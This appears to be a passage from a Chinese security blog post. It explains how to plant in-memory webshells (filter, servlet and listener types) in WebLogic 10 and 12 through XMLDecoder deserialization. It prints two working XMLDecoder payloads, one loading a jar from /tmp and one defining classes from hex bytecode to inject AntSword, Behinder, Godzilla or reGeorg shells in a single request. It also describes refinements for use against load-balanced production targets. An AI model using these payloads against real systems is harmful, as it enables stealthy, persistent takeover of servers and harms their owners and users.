![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQvJa4Ro0cQsALzfWCWS4RDwRJ1NFribl71zLj9pqo6ZibC8ichzhbZSd9Q/640?wx_fmt=png)

如上可完成 filter 内存马的植入。

**构造 weblogic 10 和 12 版本 filter 通用注入内存马**

构造通用的 payload 时，10 版本和 12 版本 filter 的流程没啥变化，只是不同版本去拿上下文对象的流程是有变化的。参考前面回显通用的部分，所以这里只贴结论：

*   差异点在于通过当前 weblogic 线程类 getCurrentWork 函数拿到的类，是不同的。10 版本拿到的是 ServletResquestImpl 类，12 版本拿到的是 ContainerSupportProviderImpl 类。
    
*   相同点是最后都拿到拿到 context 对象，来进行 filter 内存马后续的植入。
    

所以在拿到 context 之前，进行一个判断:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQvUZHC9IDgQ0LHv7VaXsJAfoDC4EppT8fL5xfP1PfR0rIOoCruXCwiaQ/640?wx_fmt=png)

后续都是一样，对 context 对象中的 classload 字段进行获取，因为 classloader 字段可以返回 ChangeAwareClassLoader 这个类

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQwQHeb9kOP74SPFlxaKUxvk3sOu7IoJiaDro9mblXdeylOXGcEXrW3PQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQggXxvqBpVeJouEkk0SuNfY4y7lqQ49UaWwXlrb48icPqu63hje0SQhg/640?wx_fmt=png)

最后加载恶意的字节码 class 即可:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ5unX0sm5oakkRpoNSPJB1plTAK2WYVadniciaXX2CjFZibHVjnWLrngDQ/640?wx_fmt=png)

如果 class 编译得版本高于目标服务器 jdk 版本，会报 Unsupportedmajor.minor version 52.0,jdk 高版本能兼容低版本，但是低版本不能兼容高版本:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQicrCh7zdF0HTvsfuliczhcfcedyUL5viaKPsEpJXVeeZMgUUlWyEEgX7Q/640?wx_fmt=png)

解决方法当然是注意编译内存马 class 文件使用的 jdk 版本。可以直接用 1.7 来编译。

**实际问题中的 xmldecoder 打 filter 内存马的小问题**

如上对通用 filter 内存马进行了构造，而其中这个注入 filter 会加载一个 class 文件，这个 class 文件就是马文件，蚁剑冰蝎之类的

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQwibpkJdLUoV8RFHuGCgOKbVKX0zaibKiajn8TvQsMNgfwR2zib7VnYeKUw/640?wx_fmt=png)

这个最早我是搜到 y4erhttps://github.com/Y4er/WebLogic-Shiro-shell/blob/master/README.md 这篇文章中的代码，当时候我也是用的这个方法打的环境:

先上传 filter 注入的类的 jar 包，再上传蚁剑类的 class，最后通过漏洞去加载 filter 注入类，完成内存马的注入。

使用的是 URLClassLoader 来加载，支持对 jar 包加载：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQBlibibm85NIaETsKccejuqzCZTHGRASFsL9cuG3UQT9hd6YvWp7Avt6w/640?wx_fmt=png)

打 neo-ReGeorg 正向代理也是，转换好了后同样的方法：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQh4RoiafdZKg9xjJrLw6feiaBYl8D8AFwF4vFaqgWicgicZVk2fyQwypasA/640?wx_fmt=png)

payload:

```
<java version="1.4.0" class="java.beans.XMLDecoder">
  <object class="java.net.URLClassLoader">
    <array class="java.net.URL" length="1">
      <void index="0">
        <object class="java.net.URL">
          <string>file:///tmp/update.jar</string>
        </object>
      </void>
    </array>
    <void method="loadClass">
      <string>weblogicupdate</string>
<void method="newInstance"></void>
    </void>
  </object>
</java>
```

但是有两个小地方可以改进：

*   1. 实际测试是可用，但是实战中这样使用的话需要先上传一个打包好的 jar 包和一个蚁剑 class，当时我遇到的问题是一个内网负载均衡，你传这两个文件需要打好多次来保证每台机器都上传成功，很累。稍微改一下就是把 filter 注入类和内存马类都转成字节数组来加载，一个包一步打通：
    
*   2. 因为如果如第一点拿点把蚁剑 class 字节码硬编码就不太灵活，不如加载的类也做个接受，做到动态注入蚁剑、冰蝎、哥斯拉、reGerog 等等
    

综上，改进最终 filter 马：

对 filter 注入类去加载的类改作传参，Hex2string 方法是对传入的 hex 转字节数组，evilClass 为你传入蚁剑字节数组的 hex 格式：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQqqKEJmQia6RTmOms6CtoiaKmKtfz1FBvURuYL5Brykttia12uLMmBib4vQ/640?wx_fmt=png)

payload 如下第一段 hex 是 filter 注入类的 hex，第二段 hex 是打入的蚁剑的 hex：

```
<java>
                 <void class="weblogic.utils.Hex" method="fromHexString" id="cls">
 <string>22222
</string>
                </void>
      <void class="org.mozilla.classfile.DefiningClassLoader">
        <void method="defineClass">
          <string>com.qing.weblogic12_filterShell</string>
          <object idref="cls"></object>
          <void method="newInstance">
          <void method="say" id="result">
<string>11111
</string>
            </void>
          </void>
        </void>
      </void>
    </java>
```

打入：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQqpszdWqFW73TvLpw9icFpPiciaHdiaKQVhP8oYcw4aia4NWymFslpgOEPAg/640?wx_fmt=png)

这样就能完成 10 版本和 12 版本通用，一个包打入动态注入蚁剑、冰蝎、reGeorg 的内存马。

0x06 结合 weblogicservlet、listener 类型内存马

因为前面对 context 的区别寻找方法都知道了，在构造通用的 servlet、listener 内存马

servlet、listener 原理参考网上的 tomcat 内存马。

**weblogic servlet 内存马**

weblogic servlet 内存马网上就两个文章，可能我理解能力不行，看不太明白，索性自己调下。

流程可以参考网上很多 tomcatservlet 内存马的文章，在 tomcatservlet 内存马种植流程中

核心找到负责管理 Servlet 的 Wrapper 类。

其中注入成功的关键点就是**如何获取到 Context**, 以及如何在 servletMapping 添加 servlet.

**1.weblogic 哪里存储着 Servlet 的路径映射关系?**

自己写个 servlet，查看哪里去查询了这个路径映射关系，以 weblogic10 为例，调用栈如下:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQMjYgLSCBpxWWvELZDXqv1tQXblXDvlNTLciaPH6vGUS6w7Fxxfiar1Mw/640?wx_fmt=png)

明显看到 weblogic.servlet.internal.WebAppServletContext.ServletInvocationAction#run 存有我对自己定义的 Servlet 类和 servlet 名称:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQZVaQT85N2gN5RQzc1dHr7icENAcGiaCE4sL31SN4uzjvgcPnSibPJ8yvQ/640?wx_fmt=png)

然后在这里下断，慢慢往上去调试，一级一级下断，过程不贴了直接贴结果：

直到你下断到 weblogic.servlet.internal.WebAppServletContext#resolveRequest 这个函数时候，, 调了你会发现在 URLMatchHelpervar2 =(URLMatchHelper)this.servletMapping.get(var1); 这里 var1 为传入的 uri，通过 var1 从 servletMapping 中匹配到合适的 servlet

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ9xeoNMk2MgyczThSrA4bIWoaUZgpicDE2bUx3VOHZ33QUuENby81YTw/640?wx_fmt=png)

查看这个 servletMapping，而 servletMapping 就正好存储着 Servlet 的**路径映射**，get 方法会调用 getExactOrPathMatch 方法，getExactOrPathMatch 方法就是去 matchMap 中去匹配，有兴趣的师傅可以跟下：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQkq1YDAvpG8q4XjKVXS2I5m7GEO8GOxbGD4zonSkibH0ia9zerQDmQzcA/640?wx_fmt=png)

**重点是我们可以通过这个 servletMapping 的 put 方法，添加自己的 servlet。**

**2.weblogic 在哪里可以动态注册 Servlet 对象?**

在第一个问题调试的时候，发现 weblogic.servlet.internal.WebAppServletContext 中就提供了 registerServlet 函数来注册 Servlet。下断然后重启就能看到它自己调用 registerServlet 函数来注册, 细节有兴趣师傅可以跟下这里不贴了:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQp0MtWBylQbRFof6r0F7xBN8kyS0NCtCAibO8tYqJHo1EuR5CC2A6usQ/640?wx_fmt=png)

综上 weblogic10 版本为例子，在 URLMatchHelper 的 servletMapping 中查询 servlet 的路径映射关系，在 WebAppServletContext 的 registerServlet 去注册 servlet。

**3. 如何获得 servletMapping 并添加恶意 servlet?**

在第一个问题中说明了，weblogic.servlet.internal.WebAppServletContext 中的 servletMapping 使用 put 方法可以添加我们想加的 servlet，经查找发现 WebAppServletContext 提供了获得 servletMapping 的方法：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ3TTqOQ7kNRtlbNLFSrGz0D30uwvSOwtIr1UricfDbqshagrWoodRdUg/640?wx_fmt=png)

**构造通用 welogicservlet 内存马**

10 版本和 12 版本拿到 context 的区别前面都有说，这里不贴了。后面就是对 servlet 的注册和添加。

上面提的 2、3 问题可以看出，注册 servlet 内存马有两个方法，一个是通过拿到 servletMapping 来添加恶意的 servlet，另一个是通过调用 registerServlet 函数来注册恶意的 servlet。

**1. 调用 registerServlet 函数来注册恶意的 servlet**

在拿到 context 后，只需要调用 registerServlet 函数即可:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQKIHOmibPZTpmK7mQFjYiabyvRqzZTkYzofKzcRic83WlKlf2eCsE3iaWRw/640?wx_fmt=png)

**2. 反射拿到 servletMapping 字段，put 方法恶意的 servlet**

这种要麻烦一些，我们先看调用这个 put 需要哪些东西。

直接在 put 下断，重启 weblogic，看看它自己怎么加的:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQEpp2FBiay3Zc9f78nMHdT2Q9rxLthTFgacF7gj1SFYL2g9qaXpKSo9A/640?wx_fmt=png)

我自己设置的 servlet 路径是 Funservlet，你一直在这里 F9 会一直等不到自己设定 servlet 那个请求，下个条件断点：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQtjicmGOg1vF6qYjW8ff7BlL7y72qMpgXic91miaicoJ1QktD7yib90LxONw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQWHR1sZORhoCnicEo2VsToTIQ0Vl4deAlTYnS1Ku0KyBMiaV9NSXewSqA/640?wx_fmt=png)

其中传入的 URLMatchHelper 如上，发现调用 put 第一个参数就是 servlet 路径，第二个是传入的 URLMatchHelper 类。

第一个参数是取的 URLMatchHelper 类的 pattern 字段，有兴趣的可以自己跟一下。

第二个参数是 URLMatchHelper 类实例，我们需要知道如何创建才方便反射构造：

weblogic.servlet.internal.URLMatchHelper#URLMatchHelper 构造函数如下，var1 为 servlet 路径，var2 为 ServletStubImpl 对象：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQThSRwoyJFuheciaxExWJuGcDsjEZKeCnl71iac8jT4h1R72teaeVKp2Q/640?wx_fmt=png)

所以现在问题变成如何实例化 ServletStubImpl 类对象，查看其构造函数。

weblogic.servlet.internal.ServletStubImpl#ServletStubImpl

var1 为 servlet 路径，var2 为添加的 servlet 名词, var3 为 context 对象，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQh1hib3mcYwrWIhxVQdeEK0TF552RrPiaUMPhR2zx9FNNkx3EFYWffthg/640?wx_fmt=png)

所以到如上，我们就写了，因为 var1，var2 是字符串，var3 为 context 对象，前面也说了如果通用去拿 context。

所以流程就是

先用 context 获取到 servletMapping，因为 servletMapping 的 put 方法需要 servlet 路径和 URLMatchHepler 实例，所以第二步为反射创建 ServletStub，传入 URLMatchHepler 构造函数并创建其实例，第三步就是调用 put 方法：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ8nGcUibkZhTS0PMhteboEoic11g24qAWfiaHroxZwl1cP6fjE6htHSxQA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQWzkadYdWRzp3V0dkBibZlKGqmKXwpP4PaXTxnbIYHo0ib5Wr2JEKJhicA/640?wx_fmt=png)

把 servlet 内存马结合 xmldecoder 反序列化的步骤如前面一样，这样不再叙述。

**weblogic listener 内存马**

这个就不贴了，context 中提供了注册 listener 函数:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ8iaN17fjje4ln3N3uB4WIfvEqqXgmfEzic9OBvqeprxJoFTZpCBMMmeA/640?wx_fmt=png)

实际调过在 filter 链中有封装了 listener，和前面一样还是要去注册触发和注册的地方，这个就没继续弄了。

**关注微信公众号**

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQf5ia5zlviaCCkjzSbmygU24UTiarRmkYoetkTAUfiaVsrW6icfo2EzAPfcw/640?wx_fmt=jpeg)

#Links

https://xz.aliyun.com/t/7228

https://zhuanlan.zhihu.com/p/396552602

https://xz.aliyun.com/t/8465#toc-3

https://gist.github.com/atxsinn3r/2172f2bc6ea964066d19a122bbf8f23c

https://blog.csdn.net/weixin_39541600/article/details/110078172

https://paper.seebug.org/1316/

[https://mp.weixin.qq.com/s/svJQ6R-VMzlTMuvgwumQiQ](https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247488886&idx=1&sn=32553f86c7a8916edc45f1da22749047&scene=21#wechat_redirect)

https://www.cnblogs.com/potatsoSec/p/13162792.html

https://www.cnblogs.com/ph4nt0mer/p/11772709.html